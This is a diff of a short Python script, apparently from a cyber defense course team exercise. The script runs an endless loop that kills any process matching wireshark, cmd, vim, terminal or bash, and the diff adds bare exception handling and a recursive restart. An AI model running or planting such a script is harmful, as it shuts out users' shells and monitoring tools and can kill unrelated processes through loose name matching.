@@ -1,7 +1,9 @@
 #Matthew Repecki
+# Cyber Defense Techniques, Fall 2023
+# Team Bravo
 import psutil
 
-bad_programs = ['wireshark','cmd','vim','terminal','bash']
+bad_programs = ['wireshark','cmd','vim','terminal','bash','cmd']
 def check_if_process_running(process_name,kill = False):
     '''
     :param process_name: Takes in process name
@@ -13,15 +15,21 @@ def check_if_process_running(process_name,kill = False):
         print(process)
         if process_name in process.info['name'] or process.info['name'] in process_name :
             if kill:
-                process.kill()
+                try:
+                    process.kill()
+                except:
+                    continue
                 ret += 1
             ret += 1
     return ret
 
 def kill_bad_programs():
     while True:
-        for program in bad_programs:
-            print(check_if_process_running(program,True))
+        try:
+            for program in bad_programs:
+                print(check_if_process_running(program,True))
+        except:
+            kill_bad_programs()
 
 kill_bad_programs()
 
